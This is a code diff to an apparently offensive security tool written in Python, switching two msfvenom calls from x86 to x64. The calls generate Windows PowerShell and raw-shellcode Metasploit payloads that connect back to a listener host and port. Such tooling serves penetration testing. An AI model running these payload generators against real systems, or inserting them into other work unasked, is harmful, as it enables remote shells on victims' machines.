@@ -55,7 +55,7 @@ def generate_msfvenom_payload(msf_payload):
 
   # Generate PSH payload
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating PSH Payload...")
-  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh -o msf_payload.ps1" % (msf_payload,listener_ip,msf_port))
+  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x64 --platform win -f psh -o msf_payload.ps1" % (msf_payload,listener_ip,msf_port))
 
   # Generate resource script
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
@@ -208,7 +208,7 @@ def generate_msfvenom_raw_payload(msf_payload):
 
   # Generate PSH payload
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating RAW shellcode Payload...")
-  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f raw -o shell.raw" % (msf_payload,listener_ip,msf_port))
+  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x64 --platform win -f raw -o shell.raw" % (msf_payload,listener_ip,msf_port))
 
   # Generate resource script
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
